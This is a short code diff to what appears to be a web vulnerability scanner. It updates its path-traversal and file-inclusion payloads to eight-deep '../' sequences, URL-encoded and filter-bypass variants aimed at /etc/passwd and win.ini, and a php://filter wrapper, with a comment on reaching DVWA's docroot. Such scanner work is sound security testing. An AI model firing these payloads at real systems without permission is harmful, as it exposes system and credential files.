@@ -43,12 +43,16 @@ _FILE_PARAMS = [
     "view", "name", "lang", "download", "filename", "dir", "folder", "load",
 ]
 
-# Read-only traversal payloads (nix + Windows) plus a PHP wrapper.
+# Read-only traversal payloads (nix + Windows) plus a PHP wrapper. Use a DEEP
+# traversal (8x ../): extra ../ at filesystem root are no-ops, so one deep
+# payload reaches /etc/passwd from both shallow and deep docroots (DVWA's
+# /var/www/html/vulnerabilities/fi/ needs 5+, a shallow app needs 1-2).
+_TRAV = "../" * 8
 _PAYLOADS = [
-    "../../../../etc/passwd",
-    "..%2f..%2f..%2fetc%2fpasswd",
-    "....//....//etc/passwd",
-    "../../../../windows/win.ini",
+    _TRAV + "etc/passwd",
+    ("..%2f" * 8) + "etc%2fpasswd",
+    ("....//" * 8) + "etc/passwd",
+    _TRAV + "windows/win.ini",
     "php://filter/convert.base64-encode/resource=index",
 ]
 
